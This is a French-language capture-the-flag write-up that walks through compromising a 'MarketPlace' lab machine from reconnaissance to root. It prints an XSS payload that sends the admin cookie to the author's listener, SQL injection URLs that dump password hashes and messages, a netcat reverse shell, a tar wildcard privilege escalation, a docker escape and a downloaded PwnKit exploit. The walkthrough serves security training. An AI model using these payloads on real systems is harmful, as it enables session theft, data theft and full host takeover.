# MarketPlace
Un nouveau petit chall, lets go !
# Enumeration
## Nmap
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-24 08:41 EST
Nmap scan report for 10.10.145.247
Host is up (0.036s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)
|   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)
|_  256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)
80/tcp    open  http    nginx 1.19.2
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: The Marketplace
|_http-server-header: nginx/1.19.2
32768/tcp open  http    Node.js (Express middleware)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: The Marketplace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 121.85 seconds
```
## Visite du site
On y trouve un page login, et on peux créer des comptes.

## Users potentiels :
On y retrouve 2 users potentiels.
```
mickael
jake
```
Seul le compte de jake renvoi **Invalid password** quand on essaye de se log dessus.
## Fonction upload
Il y a une fonction upload, qui est désactivée.
```
      <form method="POST">
        <input type="text" name="title" placeholder="Title"/> <br />
        <textarea placeholder="Description" name="description"></textarea> <br />
        <s><input type="file" style="font-size: 16px" disabled /></s>
        <p style="text-align: center">File uploads temporarily disabled due to security issues</p>
        <input type="submit" />
      </form>
```
Il est très facilement désactivable via l'inspection via le navigateur. Il faut retirer l'option **disabled**.
```
<s><input type="file" style="font-size: 16px" disabled /></s>
```
et on peux upload. On va test un revshell après.
## XSS
Il y a une XSS avec la description sur la page **http://10.10.145.247/new**, le payload suivant fonctionne

```Payload
<script>alert(1)</script>
```
## Gobuster
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 179] [--> /images/]
/new                  (Status: 302) [Size: 28] [--> /login]
/login                (Status: 200) [Size: 857]
/signup               (Status: 200) [Size: 667]
/admin                (Status: 403) [Size: 392]
/Login                (Status: 200) [Size: 857]
/messages             (Status: 302) [Size: 28] [--> /login]
/New                  (Status: 302) [Size: 28] [--> /login]
/NEW                  (Status: 302) [Size: 28] [--> /login]
/Admin                (Status: 403) [Size: 392]
/Signup               (Status: 200) [Size: 667]
/SignUp               (Status: 200) [Size: 667]
/stylesheets          (Status: 301) [Size: 189] [--> /stylesheets/]
/Messages             (Status: 302) [Size: 28] [--> /login]
/signUp               (Status: 200) [Size: 667]
/LogIn                (Status: 200) [Size: 857]
/LOGIN                (Status: 200) [Size: 857]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```
## Admin panel
On va voir si on peux récupèrer un cookie admin avec une XSS et le payload suivant:
```
<script>document.write('<img src="http://10.11.50.195?cookie=' + document.cookie + '" />')</script>
```
Je reçoit bien le token admin après l'avoir report. Merci le hint: ***If you think a listing is breaking the rules, you can report it!***
```
┌──(kali㉿kali)-[~]
└─$ sudo python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.112.87 - - [24/Nov/2023 09:58:49] "GET /?cookie=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE3MDA4Mzc5Mjl9.Qfmgkr3YHYWHRO3CqEBbBlulBVUQiw5xUjGk1og1CE0 HTTP/1.1" 200 -
```
J'ai désormais l'accès au panel admin en tant que **michael**.
## SQLi
La page http://10.10.112.87/admin?user=123%27 est vulnérable aux injection SQL.

L'url suivante : http://10.10.112.87/admin?user=123%27UNION%20SELECT%20NULL--
Répond :
```
Error: ER_PARSE_ERROR: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''UNION SELECT NULL-- -' at line 1
```
On peux donc bien agir sur la database.
On va faire un peu de recherche avec les SQLi

## Nombre de tables
Avec l'injection suivante:
```
http://10.10.99.234/admin?user=123%20UNION%20SELECT%20NULL,NULL,NULL,NULL--
```
J'ai cette erreur :
```
Error: ER_WRONG_NUMBER_OF_COLUMNS_IN_SELECT: The used SELECT statements have a different number of columns
```
Je vais donc continuer a ajouter des **NULL** jusqu'a ne plus avoir d'erreur.
Avec cette SQLi:
```
http://10.10.99.234/admin?user=2%20UNION%20SELECT%20NULL,NULL,NULL,NULL--
```
Je n'ai plus d'erreur, je sais donc qu'il y a 4 tables.
## Nom de la database
On récupère le nom de la databse :
```
http://10.10.99.234/admin?user=123%20UNION%20SELECT%20database(),1,2,3
```
Résultat dans le champ **ID**:
```
marketplace
```
On sait donc que la DB s'appelle **marketplace**
## Nom des tables
Pour avoir tout en un seul ligne, on va utiliser **group_concat**, cela sera plus facilement lisible.

La requête suivante:
```
http://10.10.99.234/admin?user=123%20UNION%20SELECT%20group_concat(table_name),2,3,4%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%27marketplace%27
```
M'affiche les tables dans le champ **ID**:
```
items,messages,users
```
On retrouve ici les 3 tables dispo dans la db marketplace.
## Table users !
Pareil ici, on va concat !
On va récupèrer le contenu de **users**
```
http://10.10.99.234/admin?user=123%20union%20SELECT%20group_concat(column_name),2,3,4%20FROM%20information_schema.columns%20WHERE%20table_schema%20=%20database()%20AND%20table_name%20=%27users%27
```
```
id,username,password,isAdministrator 
```
## Username & Password !
```
http://10.10.99.234/admin?user=123%20UNION%20SELECT%20group_concat(username,0x3a,password),2,3,4%20FROM%20users
```
```
system:$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW
michael:$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q
jake:$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG
test:$2b$10$A9bFAM511.ryD7eRh8DMGeN00Y/1yNg9.VCn65S9tWKW7EV7VnPHG
```
Je n'arrive pas a les crack, cela prend trop de temps.
Cela ne doit pas être le bon chemin.

## Peut-être dans les messages ?
```
http://10.10.99.234/admin?user=123%20union%20SELECT%20group_concat(column_name),2,3,4%20FROM%20information_schema.columns%20WHERE%20table_schema%20=%20database()%20AND%20table_name%20=%27messages%27
```
```
id,user_from,user_to,message_content,is_read 
```
```
http://10.10.99.234/admin?user=123%20UNION%20SELECT%20group_concat(id,user_from,user_to,message_content,is_read),2,3,4%20FROM%20messages
```
```
113Hello! An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password. Your new password is: @b_E***********,214Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!1,314Thank you for your report. We have reviewed the listing and found nothing that violates our rules.1,414Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!1,514Thank you for your report. We have reviewed the listing and found nothing that violates our rules.1,614Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!1,714Thank you for your report. We h
```
On a un mot de passe SSH:
```
@b_E*************
```
# Exploitation
On a le shell en SSH !

En faisant un petit **sudo -l** on retrouve un script de backup qui peux être exec en tant que michael:
```
jake@the-marketplace:/$ sudo -l
Matching Defaults entries for jake on the-marketplace:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
```
Quand on regarde le script, celui-ci créer une archive avec tout le contenu du dossier:
```
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```
On va exploiter les wildcard de Tar afin de récupèrer un shell.
Je créer d'abord un script shell.sh:
```
echo "mkfifo /tmp/f; nc 10.11.50.195 1234 0</tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f" > shell.sh
```
Ensuite, je met en place les checkpoints;
```
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```
En parallele, on lance netcat pour me mettre en écoute sur le port 1234:
```
nc -lnvp 1234
```
Puis je lance le script en tant que **michael**
```
sudo -u michael /opt/backups/backup.sh
```
et nous voila avec le shell de michael
```
listening on [any] 1234 ...
connect to [10.11.50.195] from (UNKNOWN) [10.10.187.172] 44240
michael@the-marketplace:/opt/backups$
```
## Privesc to root !
L'user **michael** fait parti du groupe docker, on peux donc pop un shell:
```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
et nous voila root:
```
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```
Le flag ce trouve dans **/root/root.txt** comme d'habitude :)
```
THM{d4***********************2}
```

# ROOT CHEATMOD LOL !
La VM est vulnérable a la CVE-2021-4034:
```
jake@the-marketplace:/tmp$ wget 10.11.50.195/PwnKit
--2023-12-01 11:08:20--  http://10.11.50.195/PwnKit
Connecting to 10.11.50.195:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18040 (18K) [application/octet-stream]
Saving to: ‘PwnKit’

PwnKit                                100%[======================================================================>]  17.62K  --.-KB/s    in 0.05s   

2023-12-01 11:08:20 (380 KB/s) - ‘PwnKit’ saved [18040/18040]

jake@the-marketplace:/tmp$ chmod +x PwnKit
jake@the-marketplace:/tmp$ ./PwnKit 
root@the-marketplace:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1000(jake)
```
